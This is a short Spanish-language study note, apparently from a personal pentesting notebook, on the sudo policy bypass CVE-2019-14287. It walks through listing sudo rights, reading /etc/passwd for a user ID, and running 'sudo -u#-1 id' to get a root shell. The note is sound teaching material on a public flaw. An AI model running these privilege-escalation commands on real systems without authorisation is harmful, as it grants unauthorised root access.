## Evasion de politica de sudo (Sudo Policy Bypass)

Afectaba a todas las versiones inferiores a la `1.8.28`. [CVE-2019-14287](https://www.sudo.ws/security/advisories/minus_1_uid/):

-  Tiene que permitir a un usuario ejecutar un comando como sudo especificado en /etc/sudoers

```
sudo -l
```
![[Pasted image 20260922152325.png]]

`Sudo` también permite que se ejecuten comandos con ID de usuario específicos, lo que ejecuta el comando con los privilegios del usuario que posee el ID especificado. El ID del usuario específico se puede leer en el archivo `/etc/passwd`

```
cat /etc/passwd | grep cry0l1t3
```
![[Pasted image 20260922152408.png]]

Por lo tanto, el ID para el usuario `cry0l1t3` sería `1005`. Si se introduce un ID negativo (`-1`) en `sudo`, esto da como resultado el procesamiento del ID `0`, que solo posee el usuario `root`. Esto, por lo tanto, conducía a una shell de root inmediata.

```
sudo -u#-1 id
```
![[Pasted image 20260922152448.png]]
